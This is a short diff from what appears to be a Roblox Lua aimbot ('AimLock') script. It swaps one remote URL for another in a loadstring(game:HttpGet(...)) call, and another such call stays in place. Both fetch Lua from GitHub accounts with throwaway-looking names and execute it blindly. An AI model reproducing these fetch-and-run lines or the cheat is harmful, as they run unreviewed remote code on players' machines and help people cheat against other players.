@@ -62,4 +62,4 @@ RunService:BindToRenderStep("AimLock", 0, function()
 local Players = game:GetService("Players")
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/pastor/main/pas'))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/bll/main/black'))()
